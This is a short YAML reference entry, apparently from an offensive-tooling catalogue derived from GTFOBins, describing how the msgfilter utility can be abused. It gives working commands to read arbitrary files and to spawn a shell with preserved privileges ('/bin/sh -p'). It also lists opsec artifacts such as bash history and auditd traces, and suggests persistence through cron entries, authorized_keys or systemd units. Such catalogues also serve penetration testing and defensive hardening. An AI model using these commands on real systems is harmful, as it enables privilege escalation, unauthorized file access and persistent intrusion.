---
name: msgfilter
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: msgfilter -P -i /path/to/input-file /bin/cat
  notes: The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
  notes: The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.
references:
- https://gtfobins.github.io/gtfobins/msgfilter/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
